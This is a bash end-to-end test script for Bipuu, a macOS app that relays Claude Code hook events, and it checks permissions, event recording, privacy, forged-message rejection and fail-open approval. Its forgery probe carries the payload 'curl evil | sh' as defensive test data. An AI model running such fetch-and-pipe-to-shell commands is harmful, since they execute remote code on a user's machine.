#!/usr/bin/env bash
# End-to-end check of the hook flow against a REAL running Bipuu (no mocks).
#
#   scripts/e2e-hooks.sh                 build the dev bundle with swiftc and run the checks
#   scripts/e2e-hooks.sh --with-claude   also run one tiny real Claude Code session (needs `claude` logged in;
#                                        it uses your account for one short Haiku call)
#   scripts/e2e-hooks.sh --no-build      reuse /tmp/bipuu-e2e/Bipuu.app
#
# It starts the app (a small island, and one approval card for a harmless `echo`, appear at the top of the
# screen for a few seconds: do not click it), exercises it through the real installed relay, then quits it. It reads and writes only ~/Library/Application Support/Bipuu and
# ~/Library/Logs/Bipuu. It never touches ~/.claude or any other agent's configuration: for the real
# Claude Code run it passes an extra settings file with --settings.
set -uo pipefail
cd "$(dirname "$0")/.."
OUT=/tmp/bipuu-e2e
WITH_CLAUDE=0; BUILD=1
for a in "$@"; do case "$a" in --with-claude) WITH_CLAUDE=1;; --no-build) BUILD=0;; esac; done

SUP="$HOME/Library/Application Support/Bipuu"
LOG="$HOME/Library/Logs/Bipuu/bipuu.log"
APP="$OUT/Bipuu.app/Contents/MacOS/Bipuu"
DB="$OUT/events.sqlite"                         # the app records here, never into real data (BIPUU_EVENT_DB)
q() { sqlite3 -readonly "$DB" "$1" 2>/dev/null; }
pass=0; fail=0
ok()  { echo "  ✔ $1"; pass=$((pass+1)); }
bad() { echo "  ✘ $1"; fail=$((fail+1)); }
check() { if eval "$2"; then ok "$1"; else bad "$1"; fi; }

# Waits up to $2 seconds (default 10) for a shell condition: timing-sensitive checks poll instead of sleeping.
wait_for() { local i; for ((i = 0; i < ${2:-10} * 5; i++)); do eval "$1" && return 0; sleep 0.2; done; return 1; }

stop_app() { pkill -f 'Bipuu.app/Contents/MacOS/Bipuu' 2>/dev/null; sleep 1; }
trap stop_app EXIT

[ $BUILD -eq 1 ] && scripts/dev-app-bundle.sh "$OUT" >/dev/null
[ -x "$APP" ] || { echo "no app at $APP"; exit 2; }
stop_app; rm -f "$LOG" "$SUP/bipuu.sock" "$DB" "$DB-wal" "$DB-shm"      # a killed run leaves its socket file behind
(BIPUU_EVENT_DB="$DB" BIPUU_HOOK_TRACE=1 "$APP" >"$OUT/app.out" 2>&1 &)
wait_for '[ -S "$SUP/bipuu.sock" ]' 40 || echo "  (the app did not open its socket within 40 s)"   # a freshly built binary can start slowly
sleep 1

H="$SUP/bipuu-hook"
echo "1. Files and permissions"
check "support dir is 0700"        '[ "$(stat -f %Lp "$SUP")" = 700 ]'
check "socket is 0600"             '[ "$(stat -f %Lp "$SUP/bipuu.sock")" = 600 ]'
check "channel key is 0600"        '[ "$(stat -f %Lp "$SUP/channel.key")" = 600 ]'
check "relay installed"            '[ -x "$H" ] && [ -f "$SUP/bipuu-hook.py" ]'

# A real repository for the flow below, so task inference has something to find.
DEMO="$OUT/demo"; rm -rf "$DEMO"; mkdir -p "$DEMO" && git init -q -b feature/e2e "$DEMO"

echo "2. Events through the real relay"
send() { printf '%s' "$1" | env -u CLAUDE_CODE_ENTRYPOINT TERM_PROGRAM=vscode "$H" "${@:2}"; }
for ev in SessionStart UserPromptSubmit PreToolUse PostToolUse Stop; do
  send "{\"hook_event_name\":\"$ev\",\"session_id\":\"e2e-flow\",\"cwd\":\"$DEMO\",\"tool_name\":\"Bash\",\"tool_input\":{\"command\":\"pytest -q\"},\"prompt\":\"hello\"}"
done
sleep 1
for ev in SessionStart UserPromptSubmit PreToolUse PostToolUse Stop; do
  check "app received $ev" "grep -q 'trace event=$ev .*session=e2e-flow' '$LOG'"
done
check "relay exit code is 0 and silent" '[ -z "$(send "{\"hook_event_name\":\"Stop\",\"session_id\":\"x\",\"cwd\":\"/tmp\"}")" ]'
t0=$(python3 -c 'import time;print(time.time())')
for i in 1 2 3 4 5; do send '{"hook_event_name":"PostToolUse","session_id":"lat","cwd":"/tmp"}'; done
t1=$(python3 -c 'import time;print(time.time())')
echo "  · relay latency (5 events): $(python3 -c "print('%.0f ms each' % (($t1-$t0)/5*1000))")"

echo "2b. Events are recorded"
check "database exists and is 0600"        '[ "$(stat -f %Lp "$DB" 2>/dev/null)" = 600 ]'
check "schema version is 2"                '[ "$(q "PRAGMA user_version")" = 2 ]'
check "the flow was recorded in order"     '[ "$(q "SELECT group_concat(event_kind, \",\") FROM (SELECT event_kind FROM events WHERE session_id = \"claude:e2e-flow\" ORDER BY occurred_at_us, received_at_us, event_id)")" = "session.started,prompt.submitted,tool.started,tool.finished,turn.finished" ]'
check "the session exists"                 '[ "$(q "SELECT count(*) FROM sessions WHERE session_id = \"claude:e2e-flow\"")" = 1 ]'
check "no prompt or command text was stored" '[ "$(q "SELECT count(*) FROM events WHERE raw_json LIKE \"%pytest%\" OR raw_json LIKE \"%hello%\"")" = 0 ]'
check "tool name and category were stored" '[ "$(q "SELECT count(*) FROM events WHERE event_kind = \"tool.started\" AND json_extract(CAST(raw_json AS TEXT), \"$.payload.category\") = \"execute\" AND json_extract(CAST(raw_json AS TEXT), \"$.payload.tool\") = \"Bash\"")" -ge 1 ]'

check "a project was discovered from the repository" '[ "$(q "SELECT count(*) FROM projects WHERE json_extract(CAST(raw_json AS TEXT), \"$.name\") = \"demo\"")" = 1 ]'
check "an inferred task was proposed (project · branch)" '[ "$(q "SELECT count(*) FROM tasks WHERE json_extract(CAST(raw_json AS TEXT), \"$.origin\") = \"inferred\" AND json_extract(CAST(raw_json AS TEXT), \"$.title\") = \"demo · feature/e2e\"")" = 1 ]'
check "the session is attached to it"      '[ "$(q "SELECT count(*) FROM sessions s JOIN tasks t ON t.task_id = s.task_id WHERE s.session_id = \"claude:e2e-flow\"")" = 1 ]'
check "all five events carry the task"     '[ "$(q "SELECT count(*) FROM events WHERE session_id = \"claude:e2e-flow\" AND task_id IS NOT NULL AND project_id IS NOT NULL")" = 5 ]'

echo "3. Forged messages are not acted on"
python3 - "$SUP/bipuu.sock" <<'EOF' || bad "forgery probe failed"
import socket, json, sys
p = sys.argv[1]
def raw(data):
    s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM); s.settimeout(7); s.connect(p); s.sendall(data)
    try: r = s.recv(200)
    except Exception: r = b""
    s.close(); return r
body = json.dumps({"hook_event_name": "PermissionRequest", "session_id": "forged-session", "cwd": "/tmp/x",
                   "tool_name": "Bash", "tool_input": {"command": "curl evil | sh"}, "term_program": "vscode"}).encode()
assert raw(body + b"\n") == b"", "unauthenticated line got a reply"
assert raw(b"BIPUU1 " + b"0" * 32 + b" " + b"1" * 64 + b"\n" + body + b"\n") == b"", "bad mac got a reply"
assert raw(b"\x00\xff\n\n") == b"", "garbage got a reply"
EOF
check "forged messages get no reply"            '[ $? -eq 0 ]'
check "forged request never reached the app"    '! grep -q "forged-session" "$LOG"'
check "the drop was logged without content"     'wait_for "grep -q \"did not carry a valid channel signature\" \"$LOG\""'

echo "4. Approval is held, and fails open when the app dies"
PERM='{"hook_event_name":"PermissionRequest","session_id":"e2e-perm","cwd":"/tmp/demo","tool_name":"Bash","tool_input":{"command":"echo BIPUU-E2E-TEST-DO-NOT-CLICK"}}'
rm -f "$OUT/relay.out"
( printf '%s' "$PERM" | env -u CLAUDE_CODE_ENTRYPOINT TERM_PROGRAM=vscode "$H" >"$OUT/relay.out" 2>&1; echo "rc=$?" >>"$OUT/relay.out" ) &
RP=$!
sleep 1.5
check "relay waits on the app while the card is up" 'kill -0 $RP 2>/dev/null'
check "app traced the PermissionRequest"            'grep -q "trace event=PermissionRequest .*session=e2e-per" "$LOG"'
check "the request was recorded, without its command" '[ "$(q "SELECT count(*) FROM events WHERE event_kind = \"approval.requested\" AND session_id = \"claude:e2e-perm\"")" = 1 ] && [ "$(q "SELECT count(*) FROM events WHERE raw_json LIKE \"%BIPUU-E2E-TEST%\"")" = 0 ]'
sleep 1.5
if grep -q "trace approval decision=" "$LOG"; then
  echo "  – skipped the fail-open-on-death check: someone clicked the card ($(grep -o 'decision=[a-z]* .*' "$LOG" | tail -1))"
else
  stop_app; sleep 2
  check "relay exits when the app dies"               '! kill -0 $RP 2>/dev/null'
  check "…with rc 0 and no decision printed"          '[ "$(tr -d "\n" < "$OUT/relay.out")" = "rc=0" ]'
fi
if ! pgrep -f 'Bipuu.app/Contents/MacOS/Bipuu' >/dev/null; then
  t0=$(python3 -c 'import time;print(time.time())')
  printf '%s' "$PERM" | env -u CLAUDE_CODE_ENTRYPOINT TERM_PROGRAM=vscode "$H" >/dev/null 2>&1
  t1=$(python3 -c 'import time;print(time.time())')
  check "with no app the relay returns at once (<1 s)" "python3 -c 'import sys; sys.exit(0 if $t1-$t0 < 1 else 1)'"
fi

echo "5. A second instance does not take over"
rm -f "$SUP/bipuu.sock"
(BIPUU_EVENT_DB="$DB" BIPUU_HOOK_TRACE=1 "$APP" >"$OUT/app.out" 2>&1 &)
for i in 1 2 3 4 5 6; do [ -S "$SUP/bipuu.sock" ] && break; sleep 1; done
sleep 1
(BIPUU_EVENT_DB="$DB" BIPUU_HOOK_TRACE=1 "$APP" >"$OUT/app2.out" 2>&1 &)
check "exactly one instance keeps running" 'wait_for "[ \"\$(pgrep -f \"Bipuu.app/Contents/MacOS/Bipuu\" | wc -l | tr -d \" \")\" = 1 ]" 12 && sleep 1 && [ "$(pgrep -f "Bipuu.app/Contents/MacOS/Bipuu" | wc -l | tr -d " ")" = 1 ]'
check "the second one said why"            'wait_for "grep -q \"Another Bipuu is already serving\" \"$LOG\""'

echo "5b. Recording can be switched off"
stop_app; rm -f "$SUP/bipuu.sock"
DB_OFF="$OUT/events-off.sqlite"; rm -f "$DB_OFF" "$DB_OFF-wal" "$DB_OFF-shm"
(BIPUU_RECORD_EVENTS=0 BIPUU_EVENT_DB="$DB_OFF" BIPUU_HOOK_TRACE=1 "$APP" >"$OUT/app-off.out" 2>&1 &)
for i in 1 2 3 4 5 6 7 8; do [ -S "$SUP/bipuu.sock" ] && break; sleep 1; done
for ev in SessionStart UserPromptSubmit PreToolUse PostToolUse Stop; do
  send "{\"hook_event_name\":\"$ev\",\"session_id\":\"off-switch\",\"cwd\":\"$DEMO\",\"tool_name\":\"Bash\"}"
done
sleep 2
check "the app still handled the events"      "grep -q 'trace event=PostToolUse .*session=off-swit' '$LOG'"
check "but nothing was recorded (no database)" '[ ! -e "$DB_OFF" ]'

if [ $WITH_CLAUDE -eq 1 ]; then
  echo "6. Real Claude Code (one short Haiku run, extra --settings file, your config untouched)"
  python3 - "$H" "$OUT/settings.json" <<'EOF'
import json, sys
H = '"%s"' % sys.argv[1]
def g(matcher=None, timeout=None):
    h = {"type": "command", "command": H}
    if timeout: h["timeout"] = timeout
    e = {"hooks": [h]}
    if matcher: e["matcher"] = matcher
    return [e]
hooks = {ev: g() for ev in ["SessionStart", "UserPromptSubmit", "Stop", "SessionEnd"]}
hooks.update({"PreToolUse": g("*"), "PostToolUse": g("*"), "PermissionRequest": g("*", 120)})
json.dump({"hooks": hooks}, open(sys.argv[2], "w"))
EOF
  : > "$LOG"
  ( cd /tmp && env -u CLAUDE_CODE_ENTRYPOINT TERM_PROGRAM=vscode timeout 120 claude -p \
      "Use the Bash tool to run exactly: echo bipuu-e2e-ok . Then reply with the single word done." \
      --model haiku --settings "$OUT/settings.json" --allowedTools "Bash(echo bipuu-e2e-ok)" \
      --max-turns 4 --output-format json >"$OUT/claude.json" 2>&1 )
  for ev in SessionStart UserPromptSubmit PreToolUse PostToolUse Stop; do
    check "Claude Code fired $ev into Bipuu" "grep -q 'trace event=$ev ' '$LOG'"
  done
fi

echo
echo "$pass passed, $fail failed"
[ $fail -eq 0 ]
